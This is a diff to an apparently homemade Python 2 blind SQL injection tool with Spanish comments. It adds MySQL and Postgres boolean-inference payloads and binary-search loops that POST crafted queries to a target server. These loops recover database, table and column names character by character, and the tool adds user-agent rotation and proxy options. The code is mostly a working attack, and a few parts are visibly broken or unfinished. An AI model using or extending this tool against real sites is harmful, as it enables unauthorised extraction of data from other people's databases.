@@ -28,11 +28,13 @@ class Injection:
 	cabeceras={}
 	proxy={} #if request need a proxy for connection it will be inside this variable
 	cookies = {} #if request need coookies it will be inside this variable
-	datos={}
+	datos={} # Data parameteros for Post request
 	method = -1 # True = Get method # False = Post method
 	server = "" #URL string
 	NoAleatorio = int(random()*100)
-	BASEDATOS=[]
+	BDatosName=[] # List with Databases name
+	ColumName=[]  # List with Columns name
+	TableName=[]
 	##########################################################################
 	##  Variables used to store all successfull queries and data extracted  ##
 	##########################################################################
@@ -85,36 +87,41 @@ class Injection:
 		'Generic':[
 					  'and {0}-1={0}-1'.format(randint(2,1001)),
 				      'and ascii(substring({0},1,1))={1}'.format(chr(NoAleatorio),ord(chr(NoAleatorio))),
-				      'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
+
 				  ],
 		'MySQL':[
 					  'and ascii(substring({0},1,1))={1}'.format(chr(randint(48,126)),ord(chr(randint(48,126)))),#'and ascii(substring({0},1,1))={1}'.format(chr(int(random()*100)),ord(chr(int(random()*100)))), # Complex substring nested ascii
 					  'and cast("{0}" as signed)=cast("{0}" as signed)'.format(NoAleatorio), # Easy integers conditionals
 					  '&& ( select if ( cast((select floor(rand()*100)) as signed)>0,2,null) )',#'&& {0}={0}'.format(int(random()*1000)), # Easy conditionals
 					  #Specific queries
-					  '&& (select @@version)',
+					  #'&& (select @@version)',
 					  'and (select database())'
+					  'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
 					  ],
 		'Postgres':[
 					  'and cast({0} as int)=cast({0} as int)'.format(int(random()*1000)),'and cast({0} as integer)=cast({0} as integer)'.format(int(random()*1000)),
 					  'and (select current_database())',
-					  'and (select user)',
+					  #'and (select user)',
 					  'and trunc(random() * cast(random()*1291 as int) - 1)>0',
 					  'and ascii(substring(@@version,1,1))=ascii("P")'
+					  'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
 					],
-		'Mssql':['and select @@version like 2008'],
+		'Mssql':["and select @@version like 2008%'"],
 
 		'Oracle':['and select @@version from dual']
 				}
 
+############################################################ Databases Names #######################################################################################################
 											#####################################################################
 											##  Se debe iterar el offset para recorrer registro a registro {0} ##
 											##  		iterar la posicion de recorte del Caracter {1}         ##
 											##			iterar el código ascii del Caracter {2}                ##
 											#####################################################################
 	PayloadsDBnames = {
-		'MySQL': 'and ascii(substring((select schema_name from information_schema.schemata limit 1 offset {0}),{1},1)) < {2}',
-		'Postgres': 'and ascii(substring((select datname from pg_database limit 1 offset {0}),{1},1)) < {2}',
+		#'MySQL': 'and ascii(substring((select schema_name from information_schema.schemata limit 1 offset {0}),{1},1)) < {2}',
+		'MySQL':"and ascii(substring((select group_concat(schema_name) from information_schema.schemata),{0},1)) < {1}",
+		#'Postgres': 'and ascii(substring((select datname from pg_database limit 1 offset {0}),{1},1)) < {2}',
+		'Postgres': "and ascii(substring((select array_to_string(array_agg(datname),',') from pg_database),{0},1)) < {1}",
 		'Mssql': '',
 		'Oracle': ''
 		}
@@ -124,12 +131,48 @@ class Injection:
 
 	#Length functions
 	RegisterLength = {
-		'MySQL': 'and (select length((select schema_name from information_schema.schemata limit 1 offset {0}))) < {1}',
-		'Postgres': 'and (select length((select datname from pg_database limit 1 offset {0}))) < {1}',
+		'MySQL': 'and (select length((select group_concat(schema_name) from information_schema.schemata))) < {0}',
+		'Postgres': "and (select length((select array_to_string(array_agg(datname),',') from pg_database))) < {0}",
 		'Mssql': '',
 		'Oracle': ''
 		}
 
+###################################################################################################################################################################################
+############################################################ Tables ###############################################################################################################
+	#Length functions
+	TableLength = {
+		'MySQL': 'and (select length((select group_concat(table_name) from information_schema.tables where table_schema="{0}"))) < {1}',
+		'Postgres': "and (select length((select array_to_string(array_agg(datname),',') from pg_database))) < {0}",
+		'Mssql': '',
+		'Oracle': ''
+		}
+
+	TablesName={
+		'MySQL':'and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="{0}"),{1},1)) < {2}',
+		'Postgres':'',
+		'Mssql':'',
+		'Oracle':''
+		}
+###################################################################################################################################################################################
+
+
+####################################################################################################################################################################################
+############################################################ Columns ###############################################################################################################
+	#Length functions
+	ColumnLength = {
+		'MySQL': 'and (select length((select group_concat(column_name) from information_schema.columns where table_name="{0}"))) < {1}',
+		'Postgres': "and (select length((select array_to_string(array_agg(datname),',') from pg_database))) < {0}",
+		'Mssql': '',
+		'Oracle': ''
+		}
+
+	ColumnNames={
+		'MySQL':'and ascii(substring((select group_concat(column_name) from information_schema.columns where table_name="{0}"),{1},1)) < {2}',
+		'Postgres':'',
+		'Mssql':'',
+		'Oracle':''
+		}
+####################################################################################################################################################################################
 	#Count functions
 	numRegisters = {
 		'MySQL': 'and (select count(*) from information_schema.schemata) < {0}',
@@ -170,7 +213,19 @@ class Injection:
 	SentHeaders = ""
 	respuesta = ""
 	dataTempo = {}
+	####
 	dnames = False
+	cnames = False
+	####
+	todasColumnas = False
+	listaColumnas=""
+	####
+	todasTablas = False
+	listaTablas=""
+	####
+	todasBases = False
+	listaBases = ""
+	RelacionBaseTabla={}
 
 	def __init__(self):
 		self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})
@@ -208,6 +263,28 @@ class Injection:
 			self.proxy = {proxy.split("://")[0]:proxy.split("://")[1]}
 		else:
 			self.proxy = self.proxy = {"http":proxy}
+
+	def setColumns(self,columnas):
+		if columnas[0]=="all":
+			self.todasColumnas = True
+		else:
+			self.todasColumnas = False
+			self.listaColumnas = columnas
+
+	def setTables(self,tablas):
+		if tablas[0] == "all":
+			self.todasTablas = True
+		else:
+			todasTablas = False
+			self.listaTablas = tablas
+
+	def setDBname(self,dbb):
+		if dbb[0] == "all":
+			self.todasBases = True
+		else:
+			self.todasBases = False
+		self.listaBases = dbb
+		print ":s",self.listaBases
 
 	def setDBMS(self,which):
 		self.Which = which
@@ -293,7 +370,6 @@ class Injection:
 										print "Bye"
 										exit(1)
 	#####################################	Printing Unsuccesfull queries ##########################################							
-							#print "|||||||||| Unsuccesfull Query |||||||||||","".join(("{0}={1}&").format(key, value) for key, value in query.items())[:-1]
 							pass
 			print "="*25,dbms," End ","="*25
 
@@ -302,7 +378,6 @@ class Injection:
 		try:
 			if answer not in ('y','n'):
 				answer = raw_input("\033[1;34m Do you want continue [y/N] \033[0m").lower()[0]
-#				print answer
 				self.Continue(answer)
 			if answer == 'y':
 				return True
@@ -314,7 +389,6 @@ class Injection:
 	# Cleaning duplicate values from Flags
 	def rmDupValue(self):
 		for dbms in self.bases:
-			#print "*"*15," ",dbms," ","*"*15
 			for field in ('Prefijo','Payload','Sufijo'):
 				self.Flags[dbms][field] = list(set(self.Flags[dbms][field]))
 	#####################################	Printing DBMS values ##########################################
@@ -323,7 +397,6 @@ class Injection:
 		tmp = 0
 		for dbms in self.bases:
 			tt = len(self.Flags[dbms]['Payload'])
-			#print type(self.Flags[dbms]['Prefijo'])
 			if  tt > tmp:
 				tmp = tt
 				self.Which = dbms
@@ -355,7 +428,7 @@ class Injection:
 				print ":"*20,"Data Requested",":"*20
 				print "-"*56
 				print "\033[1;35m{0} {1} HTTP/1.1\033[0m \n".format(previous.split(',')[1],previous.split(',')[0])
-				print previous.split(',')[5],"\n"
+				print previous.split(',')[5],"\033[0m\n"
 			except:
 				print "not vulnerable"
 		else:
@@ -384,7 +457,7 @@ class Injection:
 
 
 	#Function used to replace value of variable Comodin (passphrase) with queries to detect a sqli
-	def ChangePhrase(self,DataPost="",pload="",FirsTime=False,cAscii=0,offset=0,pos=0,dname=False,cant=False,longi=False):
+	def ChangePhrase(self,DataPost="",pload="",FirsTime=False,cAscii=0,offset=0,pos=0,dname=False,cant=False,longi=False,tname=False,nombreBase=""):
 		if FirsTime:
 			#print "Primera vez ;)"
 			lol = self.datos.copy()
@@ -395,26 +468,36 @@ class Injection:
 			#print "Original Request",lol
 			#sleep(0.2)
 		# Solo sustituye el valor para la cantidad de registros
-		if cant:
-			for parametro in DataPost.keys():
-				if self.Comodin in DataPost.get(parametro):
-					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(cAscii)
-			return DataPost
-		# Solo sustituye la longitud de un registro	
+		# if cant:
+		# 	for parametro in DataPost.keys():
+		# 		if self.Comodin in DataPost.get(parametro):
+		# 			DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(cAscii)
+		# 	return DataPost
+		# Solo sustituye la longitud de un registro
 		if longi:
-			for parametro in DataPost.keys():
-				if self.Comodin in DataPost.get(parametro):
-					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(offset,cAscii)
-			return DataPost
+			if tname:   # Longitud de la cadena concatenada de las tablas
+				for parametro in DataPost.keys():
+					if self.Comodin in DataPost.get(parametro):
+						DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(nombreBase,cAscii)
+				return DataPost
+			else:
+				for parametro in DataPost.keys():
+					if self.Comodin in DataPost.get(parametro):
+						DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(cAscii)
+				return DataPost
 		# Sustituye el valor para de cada registros, la posición que va recorriendo de la cadena y su código ascii
 		if dname:
-			#print ".-.",DataPost
 			for parametro in DataPost.keys():
 				if self.Comodin in DataPost.get(parametro):
-					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(offset,pos,cAscii)
+					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(pos,cAscii)
 			#print "ñ.ñ",DataPost
 			return DataPost
 		#Sustituyendo para extraer el nombre de la base de datos
+		if tname:
+			for parametro in DataPost.keys():
+				if self.Comodin in DataPost.get(parametro):
+					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(nombreBase,pos,cAscii)
+			return DataPost
 		else:
 			for parametro in DataPost.keys():
 				if self.Comodin in DataPost.get(parametro):
@@ -470,106 +553,161 @@ class Injection:
 			#sleep(0.3)
 		return medio
 
-	def LongitudRegistro(self,nr):
-		liminf = 0
-		limsup = 200
-		medio = (liminf + limsup)//2
-		found = False
-		while True:
-			self.dataTempo = self.datos.copy()
-			query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.RegisterLength.get(self.Which),self.newSuffix),longi=True,offset=nr,cAscii=medio)
-			#print "Length ::::",query
-			#sleep(0.5)
-			Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
-			if found:
-				#print "Found",medio
-				break
-			if Attempt.content == self.GoodRequest.content:
-				liminf = liminf
-				limsup = medio
-				medio = (liminf + limsup)//2
-			elif not(Attempt.content == self.GoodRequest.content):
-				liminf = medio
-				limsup = limsup
-				medio = (liminf + limsup)//2
-			if limsup-1-liminf==0:
-				found = True
-			#sleep(0.3)
-		return medio
+	def LongitudRegistro(self,nr=0,lsup=200,tipo="",nbase=""):
+			liminf = 0
+			limsup = lsup
+			medio = (liminf + limsup)//2
+			found = False
+			kind = tipo
+			while True:
+				#print "kind",kind
+				self.dataTempo = self.datos.copy()
+				if kind== "base":
+					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.RegisterLength.get(self.Which),self.newSuffix),longi=True,cAscii=medio)
+				elif kind== "tablas":
+					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.TableLength.get(self.Which),self.newSuffix),longi=True,tname=True,nombreBase=nbase,cAscii=medio)
+				elif kind== "columna":
+					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.RegisterLength.get(self.Which),self.newSuffix),longi=True,cname=True,nombreBase=nbase,cAscii=medio)
+				#print "Length ::::",query
+				#sleep(0.5)
+				#print "Medio:",medio
+				AttemptLongi = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+				if found:
+					#print "Found",medio
+					return medio
+					#break
+				if AttemptLongi.content == self.GoodRequest.content:
+					liminf = liminf
+					limsup = medio
+					medio = (liminf + limsup)//2
+				elif not(AttemptLongi.content == self.GoodRequest.content):
+					liminf = medio
+					limsup = limsup
+					medio = (liminf + limsup)//2
+				if limsup-1-liminf==0:
+					found = True
 
 	def getPostDBnames(self):
 		letra = ""
 		letter = ""
 		print "\n"*3
-		print "="*20
-		print "="*3,"Getting DB Names","="*3
-		print "="*20
-		listta=[]
-		liminf = 48 #48 because is number 0
-		limsup = 127
-		medio = (liminf + limsup)//2
-		found = False
-		oset = 0
-		numeroRegistros = self.CantidadRegistros()
-		#print "Cantidad de registros",numeroRegistros
-		#exit(1)
-		#posicion = 0
-		#print query
-		#print "LongitudRegistros"
-#		while oset <=numeroRegistros:
-		for oset in xrange(numeroRegistros):
-			letter=""
-			tamanioRegistro = self.LongitudRegistro(nr = oset)
-			#print "Longitud del registro",tamanioRegistro
-			#print "offset",oset
-			#sleep(0.5)
-#			while posicion<=tamanioRegistro:
-			for posicion in xrange(1,tamanioRegistro+1):
-				letra = self.test(oset,posicion)
-				letter+=letra
-			self.BASEDATOS.append(letter)
-		print self.BASEDATOS
-			#print "_"*50
-					#sleep(0.3)
-				#posicion+=1
-#			oset+=1
-		#print "Finished","".join(self.BASEDATOS)
-#			if Attempt.content == self.GoodRequest.content:
-#				break
+		print "="*25
+		print "="*3,"Guessing DB Names","="*3
+		print "="*25
+		tamanioRegistro = self.LongitudRegistro(lsup=3000,tipo="base")
+		letter = ""
+		for posicion in xrange(1,tamanioRegistro+1):
+			liminf = 31 #48 because is number 0
+			limsup = 127
+			medio = (liminf + limsup)//2
+			found = False
+			while True:
+				self.dataTempo = self.datos.copy()
+				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.PayloadsDBnames.get(self.Which),self.newSuffix),dname=True,pos=posicion,cAscii=medio)
+				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+				if found:
+					letter+=chr(medio)
+					break
+				if self.GoodRequest.content==Attempt.text:
+					liminf = liminf
+					limsup = medio
+					medio = (liminf + limsup)//2
+				elif not(Attempt.content == self.GoodRequest.content):
+					liminf = medio
+					limsup = limsup
+					medio = (liminf + limsup)//2
+				if (limsup-liminf)-1==0:
+					found = True
+		self.BDatosName = letter.split(',')
+		print self.BDatosName
 
-	def test(self,linea=0,ind=1):
-		listta=[]
-		liminf = 48 #48 because is number 0
-		limsup = 127
-		medio = (liminf + limsup)//2
-		found = False
-		while True:
-			self.dataTempo = self.datos.copy()
-			query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.PayloadsDBnames.get(self.Which),self.newSuffix),dname=True,offset=linea,pos=ind,cAscii=medio)
-			#sleep(0.1)
-			Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
-			if found:
-				#print "{0} |||| {1} |||| {2}".format(oset,posicion,chr(medio))
-				#self.BASEDATOS.append(chr(medio))
-				#sleep(0.5)
-				#break
-				return chr(medio)
-			#print 
-			if self.GoodRequest.content==Attempt.text:
-			#	print "MENOR"
-				liminf = liminf
-				limsup = medio
-				medio = (liminf + limsup)//2
-			elif not(Attempt.content == self.GoodRequest.content):
-			#	print "Mayor"
-				liminf = medio
-				limsup = limsup
-				medio = (liminf + limsup)//2
-				#medio +=1
-			#	print liminf,limsup,medio
-			if (limsup-liminf)-1==0:
-				found = True
-		#return chr(medio)
+	def getPostTables(self):
+		letra = ""
+		letter = ""
+		print "\n"*3
+		print "="*28
+		print "="*3,"Guessing Tables Name","="*3
+		print "="*28
+		#sleep(3)
+		if self.todasBases: #Cuando el usuario escribio all
+			#for ldbname in self.listaBases:
+			for ldbname in self.BDatosName:
+				#print ldbname
+				letter = ""
+				tamanioRegistro = self.LongitudRegistro(lsup=300000,tipo="tablas",nbase=ldbname)
+				print tamanioRegistro
+				for posicion in xrange(1,tamanioRegistro+1):
+					liminf = 31 #48 because is number 0
+					limsup = 127
+					medio = (liminf + limsup)//2
+					found = False
+					while True:
+						self.dataTempo = self.datos.copy()
+						query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.TablesName.get(self.Which),self.newSuffix),tname=True,nombreBase=ldbname,pos=posicion,cAscii=medio)
+						#print query
+						#sleep(0.4)
+						Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+						if found:
+							letter+=chr(medio)
+							break
+						if self.GoodRequest.content==Attempt.text:
+							liminf = liminf
+							limsup = medio
+							medio = (liminf + limsup)//2
+						elif not(Attempt.content == self.GoodRequest.content):
+							liminf = medio
+							limsup = limsup
+							medio = (liminf + limsup)//2
+						if (limsup-liminf)-1==0:
+							found = True
+		else:# Cuando el usuario escribe las bases de datos
+			for ldbname in self.listaBases:
+				#print ldbname
+				letter = ""
+				tamanioRegistro = self.LongitudRegistro(lsup=3000,tipo="tablas",nbase=ldbname)
+				print tamanioRegistro
+				for posicion in xrange(1,tamanioRegistro+1):
+					liminf = 31 #48 because is number 0
+					limsup = 127
+					medio = (liminf + limsup)//2
+					found = False
+					while True:
+						self.dataTempo = self.datos.copy()
+						query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.TablesName.get(self.Which),self.newSuffix),tname=True,nombreBase=ldbname,pos=posicion,cAscii=medio)
+						#print query
+						#sleep(0.4)
+						Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+						if found:
+							letter+=chr(medio)
+							break
+						if self.GoodRequest.content==Attempt.text:
+							liminf = liminf
+							limsup = medio
+							medio = (liminf + limsup)//2
+						elif not(Attempt.content == self.GoodRequest.content):
+							liminf = medio
+							limsup = limsup
+							medio = (liminf + limsup)//2
+						if (limsup-liminf)-1==0:
+							found = True
+				#print ldbname,"=>",letter.split(',')
+				self.RelacionBaseTabla[ldbname]=letter.split(',')
+			print "TABLAS",self.RelacionBaseTabla
+
+	def getPostColumns():
+		letra = ""
+		letter = ""
+		print "\n"*3
+		print "="*20
+		print "="*3,"Getting Columns Name","="*3
+		print "="*20
+		sleep(3)
+		if self.todasColumnas: #Cuando el usuario escribio all
+			for ldbname in self.BDatosName:
+				pass
+		else:
+			for lcname in self.listaColumnas:
+				pass
 
 
 	def Begin(self):
@@ -632,15 +770,16 @@ class Injection:
 				if self.dnames:
 					self.getDelimiters()
 					self.getPostDBnames()
+					self.getPostTables()
 				else: exit(1)
 			else: # If a scanning was previously did it
 				self.showData(Previo=True)
 				if self.dnames:
 					self.getDelimiters()
 					self.getPostDBnames()
+					self.getPostTables()
 				#print "Ya se hizo un escaneo previo"
 				exit(1)
-			#self.test()
 
 	def CreateFiles(self):
 		self.hname = self.server.split("/")[2]
@@ -675,9 +814,10 @@ class Injection:
 			except:
 				pass
 				#print "Logs already exists"
+
 def Opciones(argv):
 	try:
-		opciones, argumentos = getopt(argv[1:],"h:v",["request=","cookie=","user-agent=","method=","random-agent","data=","proxy=","columns=","server=",'dbname'])
+		opciones, argumentos = getopt(argv[1:],"ho:v",["request=","cookie=","user-agent=","method=","random-agent","data=","proxy=","columns=","tables=","server=",'dbname=','db'])
 	except GetoptError:
 		print """### Ayuda ###\n{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>""".format(argv[0])
 		exit(2)
@@ -701,6 +841,12 @@ def Opciones(argv):
 		elif opt == '--random-agent':
 			inject.setAgent("")
 		elif opt == '--dbname':
+			try:
+				ddd = vals.split(',')
+			except:
+				ddd="all"
+			inject.setDBname(ddd)
+		elif opt == '--db':
 			inject.searchDbname(True)
 		#Proxy params
 		elif opt == '--proxy':
@@ -711,15 +857,27 @@ def Opciones(argv):
 				print "You must insert some DBs strings: "+" ,".join(('Generic','MySQL','Postgres','Mssql','Oracle'))
 				exit(1)
 			inject.setDBMS(vals)
+		#Get table specified
+		elif opt == '--tables':
+			try:
+				tbles = vals.split(',')
+			except:
+				tbles="all"
+			inject.setTables(tbles)
 		#Get column specified
 		elif opt == '--columns':
-			pass
+			try:
+				clumns = vals.split(',')
+			except:
+				clumns="all"
+			inject.setColumns(clumns)
 		#Option not valid
 		elif opt == '--method':
 			if vals in ('get','post'):
 				inject.setMethod(vals)
 			else:
 				print "Method not implemented"
+				exit(1)
 		else:
 			print '<{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
 			exit(1)
@@ -735,7 +893,6 @@ def main():
 
 if __name__ == "__main__":
 	if isdir(getenv("HOME")+"/sql/"):
-		#print "Ya existe"
 		pass
 	else:
 		try:
@@ -743,6 +900,5 @@ if __name__ == "__main__":
 			mkdir(p)
 		except:
 			pass
-		#print "Can't create directory"
 	inject = Injection()
 	Opciones(argv)
